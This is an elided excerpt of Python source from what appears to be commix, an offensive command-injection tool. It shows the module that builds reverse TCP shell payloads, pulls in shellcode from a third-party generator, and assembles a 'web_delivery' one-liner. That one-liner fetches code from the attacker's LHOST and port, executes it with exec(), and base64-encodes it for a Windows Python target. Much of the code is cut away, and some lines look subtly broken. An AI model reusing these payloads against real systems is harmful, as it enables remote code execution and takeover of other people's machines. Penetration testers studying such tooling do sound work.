...
\ncommix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL + """) > """)))
    ...
    # Bash-reverse-shell 
      ...
      tmp_file = ''.join([random.choice(string.ascii_letters + string.digits) for n in range(5)])
          ...
          if windows_reverse_shell == '1':
            ...
            try:
              ...
              with open(output, 'r') as content_file:
                ...
                shellcode = reduce(lambda a, kv: a.replace(*kv), iter(list(repls.items())), content_file.read()).rstrip()[1:]
          ...
          # TrustedSec's Magic Unicorn (3rd Party)
            ...
            try:
              ...
              try:
                ...
                other_shell = urllib.parse.quote_plus(other_shell) 
                print(("[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"))
                # Remove the ouput file
                os.remove(output)
...
\ncommix(""" + Style.BRIGHT + Fore.RED + """web_delivery""" + Style.RESET_ALL + """) > """)))
        ...
        if 'payload' in locals():
          ...
          if web_delivery == '1':
            data = "import urllib; r=urllib.request.urlopen('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "'); exec(r.read());"
            data = base64.b64encode(data)
            if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PYTHON_DIR: 
              set_python_working_dir()
              other_shell = settings.WIN_PYTHON_DIR + " -c exec('" + data + "'.decode('base64'))"
